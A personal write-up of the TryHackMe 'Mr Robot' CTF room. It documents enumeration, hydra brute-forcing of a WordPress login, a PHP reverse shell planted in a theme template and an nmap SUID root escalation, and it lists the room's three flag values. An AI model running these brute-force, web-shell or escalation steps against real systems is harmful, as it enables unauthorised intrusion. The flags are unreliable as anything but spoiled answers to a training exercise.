# Mr Robot CTF

**Platform:** TryHackMe
**Date:** 2026-08-29
**Difficulty:** Medium
**Category:** Linux / Web Hacking / Privilege Escalation
**Room URL:** https://tryhackme.com/room/mrrobot
**Status:** ✅ Completed

---

## 📌 What Was This Room About?
> Based on the Mr Robot show to solve this CTF you have to exploit a Wordpress login page and use a php shell to gain initial access into the box. Then use a nmap interactive shell exploit to escalate your privileges to root and find the last of three keys.

---

## 🔍 Reconnaissance

### Nmap Scan
```bash
nmap 10.10.195.93 -sV -T4 -oA nmap-scan -open  
```

**Results:**
| Port         | Service  |      Version     | Notes    |
|----------|---------|--------------|---------|
| 80/tcp     |  http      |   Apache httpd |  *Means that there is a listener on port 80* |
| 443/tcp   |  ssl/http|   Apache httpd |

---

## 🧭 Steps I Took

> Write each step in order. Explain WHY you did it, not just WHAT you did.

### Step 1 — 
- **What I did:** After doing the nmap scan I opened a pretty nice website in my browser. I did some basic enumeration and used gobuster to find some interesting hidden directories. 
- Gobuster’s output includes a lot of HTTP redirection codes, but also some very interesting directories such as `/wp-login`,`/robots`, and the most important direcotory, the one with the key: `key-1-of-3.txt`. In `/robots` I found downloaded a file named fsocity.dic, a file containing a bunch of usernames and passwords.

- **Command/Tool used:**
```bash
# gobuster dir -u http://10.10.195.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
- **What I found:** I found `/wp-login` and `/robots` two very important directories.
- **Why it matters:** This matters because now that i have done the required enumeration I have found a login page and a wordlist for bruteforcing.

### Step 2 — 
- **What I did:** I now started using fsocity.dic to brute force the wordpress login page. One thing to note, wordpress login pages usually have bad security, and I mean real bad so that means that bruteforcing should be simple. 

- Let’s focus on **obtaining the credentials needed to login** to the wordpress portal. Here are the steps to find the credentials:

- Check the **error message** of a failed login attempt. We will need this message for performing a dictionary attack using hydra.
- Capture the packet of the failed login attempt with Burp Suite’s Proxy to find its **parameters**. We will also need these for performing the dictionary attack with hydra.
- Perform a dictionary attack with hydra to **build a wordlist containing valid usernames**.
- Perform a second dictionary attack **using the newly-created username wordlist to find passwords**, again, using hydra.
- **Command/Tool used:**
```bash
# hydra -L fs-list -p test 10.10.195.93 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30

After finding the username and password i tried to enter it into the login page but apparently the password was wrong. So knowing the username, Elliot, i used this hydra command to find the correct password:

# hydra -l elliot -P fs-list 10.10.195.93 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```
- **What I found:** I found that sometimes you need to run two hydra commands to find the successful login credentials.

### Step 3 — 
- **What I did:** I was able to successfully login in as `Elliot` with the password `ER28-0652`. User `elliot` seems to be an administrator account. This means that it has access to the **Editor’s tab** (Appearance → Editor). On the right-hand side, there is a list of templates containing **PHP scripts**. Since we have an admin account, we can simply replace one of the template’s code, e.g. `Archives`, with PHP code that will launch a reverse shell for us. 
- I used pentest monkeys php reverse shell: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php. I started a listener with netcat - nc -lnvp 1234 and I replaced the code in Archives with the payload and went to this url to launch the shell: http://10.10.195.93/wp-content/themes/twentyfifteen/archive.php.

- **Command/Tool used:**
```bash
# nc -lnvp 1234
```

### Step 4 — 
- **What I did:** I was able to get shell access into the target machine. I found the second key but only the robot user has the privileges to access it. There was another interesting file in that directory `password.raw-md5` was a password backup for the Robot user including the password hash for that user. Using Crackstation to decrypt the hash I got this password: `abcdefghijklmnopqrstuvwxyz`. Before I accessed the robot user I had to stabilise my shell with: python3 -c 'import pty; pty.spawn("/bin/bash")'. And at last gaining access to the second key.
- **Command/Tool used:**
```bash
# su robot
# python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Step 5 — 
- **What I did:** This is the last step. I have to escalate my privileges to root. I used `find / -perm -u=s -type f 2>/dev/null` to find anything suspicious and i did. It was quite wierd to see nmap listed as one of SUID files. So I searched GFTOBINS and found an exploit to escalate my privileges. I followed the instructions from GTFOBins and used this command `/usr/local/bin/nmap --interactive`  to be able to sqawn a root shell using nmap!
- After sqawning a root shell I navigated the the root directory and found the last of the keys.
- **Command/Tool used:**
```bash
# find / -perm -u=s -type f 2>/dev/null
# /usr/local/bin/nmap --interactive
```
---
## 🛠 Commands Used

| Command                                                                                                                                                                                                                                                                                | What It Does                                             |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------- |
| nmap 10.10.195.93 -sV -T4 -oA nmap-scan -open                                                                                                                                                                                                                                          | Scans the target machine for any interesting open ports  |
| gobuster dir -u http://10.10.195.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt                                                                                                                                                                                     | Scans the target machine for any interesting directories |
| hydra -L fs-list -p test 10.10.195.93 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30<br><br>&<br><br>hydra -l elliot -P fs-list 10.10.195.93 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30<br> | Bruteforeces the wordpress login page using fs-list.     |
| nc -lnvp 1234                                                                                                                                                                                                                                                                          | Starts a listner                                         |
| su robot                                                                                                                                                                                                                                                                               | Swaps users                                              |
| find / -perm -u=s -type f 2>/dev/null                                                                                                                                                                                                                                                  | Locates any files with SUID permisions                   |
| /usr/local/bin/nmap --interactive                                                                                                                                                                                                                                                      | Spawns a root shell exploiting nmap                      |

---

## 🚩 Flags Found

| Flag  | Value                            | Key Location                                                       |
| ----- | -------------------------------- | ------------------------------------------------------------------ |
| Key 1 | 073403c8a58a1f80d943455fb30724b9 | Found using Gobuster Enumeration                                   |
| Key 2 | 822c73956184f694993bede3eb39f959 | Found by exploiting php vulnerability and gaining reverse shell    |
| Key 3 | 04787ddef27c3dee1ee161b21670b4e4 | Found by exploiting nmap --interactive and gaining root privileges |


---

## 🔗 Linked Notes
> Connect this report to your concept and tool notes.

- [[Nmap]]
- [[Linux Commands]]
- [[Add more links as relevant]]

---

## 📎 Resources Used
> Links to tutorials, writeups, or documentation that helped you.

- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php


---
*Report written in [[TryHackMe Vault]] — part of my ethical hacking journey 🛡️*


![](https://miro.medium.com/v2/resize:fit:667/1*YPgI7DfyQ0PHd35BjgY7vQ.jpeg)


